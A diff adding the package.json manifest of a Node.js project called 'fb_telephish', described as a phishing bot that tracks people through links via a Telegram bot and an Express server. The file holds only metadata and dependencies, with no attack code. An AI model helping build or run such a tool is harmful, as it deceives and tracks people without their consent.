@@ -1,0 +1,20 @@
+{
+  "name": "fb_telephish",
+  "version": "1.0.0",
+  "description": "A Phishing bot track downn pleople through link",
+  "main": "index.js",
+  "scripts": {
+    "start": "node index.js"
+  },
+  "dependencies": {
+    "body-parser": "^1.19.1",
+    "express": "^4.17.1",
+    "node-telegram-bot-api": "^0.64.0",
+    "valid-url": "^1.0.9"
+  },
+  "engines": {
+    "node": ">=12.0.0"
+  },
+  "author": "Fahim Ahamed",
+  "license": "MIT"
+}
